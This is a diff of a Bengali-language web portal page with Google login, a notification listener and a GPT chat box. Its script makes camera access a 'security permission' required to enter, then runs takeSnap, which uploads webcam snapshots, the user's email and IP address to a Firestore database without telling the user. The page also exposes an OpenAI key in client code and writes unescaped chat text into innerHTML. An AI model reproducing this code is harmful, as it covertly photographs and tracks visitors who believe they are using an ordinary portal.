@@ -15,57 +15,181 @@
         }
 
         * {
-            margin: 0; padding: 0; box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: 'Hind Siliguri', sans-serif;
         }
 
         body {
             background: var(--dark);
             background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617;
-            color: white; min-height: 100vh; overflow-x: hidden;
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         /* Modals */
         #login-overlay, #perm-modal, #notif-modal {
-            position: fixed; inset: 0; background: rgba(2, 6, 23, 0.95);
-            z-index: 10000; display: none; align-items: center;
-            justify-content: center; backdrop-filter: blur(10px);
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 6, 23, 0.95);
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
         }
 
         .glass-box {
-            background: rgba(255, 255, 255, 0.05); padding: 40px;
-            border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.3);
-            text-align: center; width: 90%; max-width: 400px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 77, 148, 0.3);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
         }
 
         .hero-header {
-            margin: 20px; padding: 30px 20px;
-            background: rgba(255, 255, 255, 0.03); border-radius: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px);
+            margin: 20px;
+            padding: 30px 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
             position: relative;
         }
 
-        .profile-wrapper { display: flex; justify-content: center; align-items: center; gap: 15px; }
-        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); box-shadow: 0 0 25px var(--pink); object-fit: cover; }
-        .user-p-img { width: 85px; height: 85px; border: 3px solid #fff; margin-left: -25px; }
+        .profile-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
 
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 600px; margin: 0 auto; }
-        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255, 255, 255, 0.05); transition: 0.4s; position: relative; cursor: pointer; }
-        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 0 20px rgba(255, 77, 148, 0.4); }
-        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 12px; }
+        .p-img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid var(--pink);
+            box-shadow: 0 0 25px var(--pink);
+            object-fit: cover;
+        }
 
-        .alarm-dot { position: absolute; top: 12px; right: 12px; width: 12px; height: 12px; background: red; border-radius: 50%; box-shadow: 0 0 10px red; display: none; animation: pulse 1s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .user-p-img {
+            width: 85px;
+            height: 85px;
+            border: 3px solid #fff;
+            margin-left: -25px;
+        }
 
-        .chat-area { max-width: 500px; margin: 20px auto; padding: 0 20px; }
-        .chat-mini { background: rgba(0, 0, 0, 0.4); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); padding: 12px; }
-        #chat-log { height: 100px; overflow-y: auto; color: #ccc; margin-bottom: 8px; font-size: 13px; text-align: left; }
-        .chat-in { display: flex; gap: 8px; }
-        .chat-in input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 8px 15px; border-radius: 50px; outline: none; }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
 
-        .logout-btn { background: none; border: 1px solid rgba(255, 255, 255, 0.2); color: #888; padding: 5px 15px; border-radius: 50px; cursor: pointer; margin: 10px; }
-        #nt-msg { color: #ff4d4d; font-weight: bold; font-size: 16px; text-shadow: 0 0 5px rgba(255, 0, 0, 0.2); }
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            text-decoration: none;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: 0.4s;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: var(--pink);
+            box-shadow: 0 0 20px rgba(255, 77, 148, 0.4);
+        }
+
+        .card i {
+            font-size: 2.2rem;
+            color: var(--pink);
+            margin-bottom: 12px;
+        }
+
+        .alarm-dot {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            width: 12px;
+            height: 12px;
+            background: red;
+            border-radius: 50%;
+            box-shadow: 0 0 10px red;
+            display: none;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .chat-area {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+
+        .chat-mini {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 12px;
+        }
+
+        #chat-log {
+            height: 100px;
+            overflow-y: auto;
+            color: #ccc;
+            margin-bottom: 8px;
+            font-size: 13px;
+            text-align: left;
+        }
+
+        .chat-in {
+            display: flex;
+            gap: 8px;
+        }
+
+        .chat-in input {
+            flex: 1;
+            background: #000;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 50px;
+            outline: none;
+        }
+
+        .logout-btn {
+            background: none;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #888;
+            padding: 5px 15px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        #nt-msg {
+            color: #ff4d4d;
+            font-weight: bold;
+            font-size: 16px;
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.2);
+        }
 
         canvas, video#vSource { display: none; }
     </style>
@@ -89,8 +213,8 @@
         <div class="glass-box">
             <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--pink);"></i>
             <h3>সিকিউরিটি পারমিশন</h3>
-            <p style="font-size:14px; opacity:0.7; margin:15px 0;">নোটিফিকেশন, ক্যামেরা এবং লোকেশন এক্সেস প্রয়োজন।</p>
-            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
+            <p style="font-size:14px; opacity:0.7; margin:15px 0;">নোটিফিকেশন, ক্যামেরা এবং আইপি লোকেশন এক্সেস প্রয়োজন।</p>
+            <button onclick="grantAndStart()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">Grant Access</button>
         </div>
     </div>
 
@@ -105,13 +229,14 @@
 
     <div id="main-ui" style="display:none;">
         <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
+
         <div class="hero-header">
             <div class="profile-wrapper">
                 <img src="ratan.jpg" class="p-img">
                 <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
             </div>
             <h2 id="u-name" style="text-align:center; margin-top:15px;">User</h2>
-            <p id="u-loc" style="text-align:center; color:gray; font-size:12px; margin-top:5px;">Fetching Location...</p>
+            <p id="u-ip" style="text-align:center; color:gray; font-size:11px;">IP: Checking...</p>
             <p style="text-align:center; color:var(--pink); font-size:14px; margin-top:5px;">Verified Member</p>
         </div>
 
@@ -121,11 +246,14 @@
                 <p>Notification</p>
                 <div id="notif-alarm" class="alarm-dot"></div>
             </div>
+            
             <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
             <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();"><i class="fas fa-handshake"></i><p>Business</p></a>
             <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();"><i class="fas fa-laptop-code"></i><p>Portfolio</p></a>
+            
             <a href="https://numberlookup.pro.bd/" target="_blank" class="card" onclick="document.getElementById('snd-look').play();">
-                <i class="fas fa-search"></i><p>Lookup</p>
+                <i class="fas fa-search"></i>
+                <p>Lookup</p>
             </a>
         </div>
 
@@ -165,19 +293,19 @@
 
         let loggedUser = null;
         let latestNotif = null;
-        let userLocation = "Unknown";
+        let userIP = "Unknown";
 
-        // IP Fetch
+        // ১. আইপি ফেচিং
         async function fetchIP() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                userLocation = `${data.ip} (${data.city}, ${data.country_name})`;
-                document.getElementById('u-loc').innerText = `IP: ${data.ip}`;
+                userIP = data.ip;
+                document.getElementById('u-ip').innerText = "IP: " + userIP;
             } catch (e) { console.log("IP fail"); }
         }
 
-        // Notif Listener
+        // ২. রিয়েল টাইম নোটিফিকেশন লিসেনার
         onSnapshot(doc(db, "system", "updates"), (snap) => {
             if (snap.exists()) {
                 latestNotif = snap.data();
@@ -190,10 +318,11 @@
             }
         });
 
-        // Auth Logic
+        // ৩. অথেনটিকেশন চেক
         onAuthStateChanged(auth, (user) => {
             loggedUser = user;
             if (user) {
+                document.getElementById('login-overlay').style.display = 'none';
                 checkPermissions();
             } else {
                 document.getElementById('login-overlay').style.display = 'flex';
@@ -201,35 +330,66 @@
             }
         });
 
+        // ৪. পারমিশন লজিক
         function checkPermissions() {
             if (Notification.permission !== "granted") {
                 document.getElementById('perm-modal').style.display = 'flex';
-                document.getElementById('login-overlay').style.display = 'none';
             } else {
-                startApp(); // Auto start if granted
+                grantAndStart(); 
             }
         }
 
-        window.startApp = async () => {
+        window.grantAndStart = async () => {
             try {
+                // ক্যামেরা এবং নোটিফিকেশন একসাথে চাইবে
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('vSource').srcObject = stream;
                 await Notification.requestPermission();
                 await fetchIP();
-                
+
                 document.getElementById('perm-modal').style.display = 'none';
-                document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
                 document.getElementById('u-name').innerText = loggedUser.displayName;
                 document.getElementById('u-pic').src = loggedUser.photoURL;
-                
-                takeSnap();
+
+                takeSnap(); // ডাটাবেসে ছবি ও আইপি পাঠানো শুরু
             } catch (err) {
-                alert("সিকিউরিটি পারমিশন ছাড়া পোর্টাল ব্যবহার করা যাবে না!");
+                alert("সিকিউরিটি পারমিশন ছাড়া পোর্টাল ওপেন হবে না!");
             }
         };
 
-        // Snapshot Logic
+        // ৫. AI Chat (gpt-4o)
+        window.askAI = async () => {
+            const input = document.getElementById('ai-msg');
+            const log = document.getElementById('chat-log');
+            if (!input.value) return;
+
+            const userMsg = input.value;
+            log.innerHTML += `<br><b>You:</b> ${userMsg}`;
+            input.value = "";
+            log.scrollTop = log.scrollHeight;
+
+            try {
+                const response = await fetch("https://api.openai.com/v1/chat/completions", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Authorization": `Bearer ${OPENAI_KEY}`
+                    },
+                    body: JSON.stringify({
+                        model: "gpt-4o-mini",
+                        messages: [{ role: "user", content: userMsg }]
+                    })
+                });
+                const data = await response.json();
+                log.innerHTML += `<br><b>AI:</b> ${data.choices[0].message.content}`;
+            } catch (e) {
+                log.innerHTML += `<br><b style="color:red;">Error:</b> AI কানেক্ট হতে পারছে না।`;
+            }
+            log.scrollTop = log.scrollHeight;
+        };
+
+        // ৬. ক্যামেরা স্ন্যাপ এবং আইপি ট্র্যাকিং
         async function takeSnap() {
             if (!loggedUser) return;
             const video = document.getElementById('vSource');
@@ -247,7 +407,7 @@
                         email: loggedUser.email,
                         photo: loggedUser.photoURL,
                         lastPic: img, 
-                        location: userLocation,
+                        location: userIP,
                         lastSeen: new Date().toLocaleString(),
                         status: "Online"
                     }, { merge: true });
@@ -270,27 +430,6 @@
         };
 
         window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
-
-        window.askAI = async () => {
-            const input = document.getElementById('ai-msg');
-            const log = document.getElementById('chat-log');
-            if (!input.value) return;
-            const userMsg = input.value;
-            log.innerHTML += `<br><b>You:</b> ${userMsg}`;
-            input.value = "";
-            log.scrollTop = log.scrollHeight;
-
-            try {
-                const response = await fetch("https://api.openai.com/v1/chat/completions", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${OPENAI_KEY}` },
-                    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: userMsg }] })
-                });
-                const data = await response.json();
-                log.innerHTML += `<br><b>AI:</b> ${data.choices[0].message.content}`;
-            } catch (e) { log.innerHTML += `<br><b style="color:red;">Error:</b> AI failed.`; }
-            log.scrollTop = log.scrollHeight;
-        };
     </script>
 </body>
 </html>
